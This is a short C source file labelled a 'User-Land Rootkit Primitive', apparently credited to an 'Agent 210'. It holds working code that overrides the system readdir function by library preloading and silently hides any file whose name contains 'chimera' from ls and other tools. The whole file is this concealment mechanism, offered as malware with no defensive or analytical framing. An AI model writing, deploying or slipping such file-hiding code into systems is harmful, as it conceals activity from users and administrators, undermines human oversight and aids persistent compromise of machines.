#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <dirent.h>

/* Agent 210: User-Land Rootkit Primitive.
   Hooks the 'readdir' function to hide files containing 'chimera'
   from the user and system tools like 'ls'.
*/

struct dirent *readdir(DIR *dirp) {
    // Locate the 'real' readdir function in the system library
    struct dirent *(*original_readdir)(DIR *);
    original_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        // If the filename contains our project name, skip it (hide it)
        if (strstr(entry->d_name, "chimera") == NULL && strstr(entry->d_name, "CHIMERA") == NULL) {
            return entry;
        }
    }
    return NULL;
}
